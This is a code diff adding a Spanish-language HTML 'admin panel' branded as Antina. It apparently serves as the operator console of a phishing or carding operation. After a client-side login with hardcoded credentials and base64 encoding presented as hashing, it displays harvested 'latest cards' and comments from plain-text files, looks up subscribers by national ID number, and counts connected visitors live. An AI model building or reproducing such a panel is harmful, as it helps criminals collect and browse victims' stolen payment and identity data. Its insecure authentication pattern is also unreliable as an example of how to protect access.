@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Console - Antina</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      color: #25d366;
+      font-family: 'Courier New', monospace;
+      overflow-x: hidden;
+    }
+
+    ::selection {
+      background: #25d366;
+      color: #000;
+    }
+
+    header {
+      background: #111;
+      padding: 20px;
+      text-align: center;
+      animation: flicker 1s infinite alternate;
+      border-bottom: 2px solid #25d366;
+    }
+
+    header h1 {
+      font-size: 28px;
+      margin: 0;
+      letter-spacing: 2px;
+    }
+
+    .container {
+      padding: 20px;
+      animation: fadeIn 1.5s ease;
+    }
+
+    h3 {
+      margin-top: 30px;
+      border-bottom: 1px solid #25d366;
+      padding-bottom: 5px;
+    }
+
+    input, textarea, button {
+      background-color: #111;
+      border: 1px solid #25d366;
+      color: #25d366;
+      font-family: monospace;
+      font-size: 14px;
+      padding: 10px;
+      margin-bottom: 10px;
+      border-radius: 4px;
+      width: 100%;
+      box-sizing: border-box;
+      transition: background 0.3s;
+    }
+
+    input:focus, textarea:focus {
+      background: #000;
+      outline: none;
+    }
+
+    button {
+      cursor: pointer;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    button:hover {
+      background-color: #25d366;
+      color: #000;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    pre {
+      white-space: pre-wrap;
+      background: #111;
+      padding: 10px;
+      border: 1px solid #25d366;
+      border-radius: 4px;
+      font-size: 13px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+
+    .topbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: #25d366;
+      font-size: 14px;
+    }
+
+    @keyframes flicker {
+      0% { opacity: 1; }
+      100% { opacity: 0.92; }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="topbar">
+    <h1>🛠 PANEL ADMINISTRACIÓN - ANTINA 🛠</h1>
+  </div>
+</header>
+
+<div class="container">
+
+  <!-- Login -->
+  <div id="login-box">
+    <h3>🔐 Acceso seguro</h3>
+    <input type="text" id="username" placeholder="Usuario" />
+    <input type="password" id="password" placeholder="Contraseña" />
+    <button onclick="login()">Ingresar</button>
+    <p id="login-error" style="color: red; display: none;">❌ Acceso denegado</p>
+  </div>
+
+  <!-- Panel -->
+  <div id="panel" class="hidden">
+    <h3>🔎 Buscar por DNI</h3>
+    <input type="text" id="dni" placeholder="DNI del abonado">
+    <button onclick="buscarDni()">Consultar</button>
+    <pre id="resultado-dni"></pre>
+
+    <h3>📝 Últimos Comentarios</h3>
+    <textarea id="comentarios" readonly></textarea>
+
+    <h3>💳 Últimas Tarjetas</h3>
+    <textarea id="tarjetas" readonly></textarea>
+
+    <h3>👥 Conectados en vivo: <span id="counter">0</span></h3>
+  </div>
+</div>
+
+<script>
+  const USER = "yaku";
+  const HASHED_PASS = btoa("24k");
+
+  function login() {
+    const u = document.getElementById("username").value.trim();
+    const p = document.getElementById("password").value.trim();
+    if (u === USER && btoa(p) === HASHED_PASS) {
+      document.getElementById("login-box").classList.add("hidden");
+      document.getElementById("panel").classList.remove("hidden");
+      cargarDatos();
+      iniciarWebSocket();
+    } else {
+      document.getElementById("login-error").style.display = "block";
+    }
+  }
+
+  function buscarDni() {
+    const dni = document.getElementById("dni").value.trim();
+    if (!dni) return alert("❗ Ingresá un DNI válido");
+
+    fetch('/buscar-dni', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ dni })
+    })
+    .then(res => res.json())
+    .then(data => {
+      document.getElementById("resultado-dni").textContent = JSON.stringify(data, null, 2);
+    })
+    .catch(() => alert("Error al buscar DNI"));
+  }
+
+  function cargarDatos() {
+    fetch('/comentarios.txt')
+      .then(r => r.text())
+      .then(t => document.getElementById('comentarios').value = t);
+
+    fetch('/tarjetas.txt')
+      .then(r => r.text())
+      .then(t => document.getElementById('tarjetas').value = t);
+  }
+
+  function iniciarWebSocket() {
+    const ws = new WebSocket(`ws://${location.host}`);
+    ws.onmessage = (e) => {
+      const data = JSON.parse(e.data);
+      if (data.type === "count") {
+        document.getElementById("counter").textContent = data.count;
+      }
+    };
+  }
+</script>
+
+</body>
+</html>
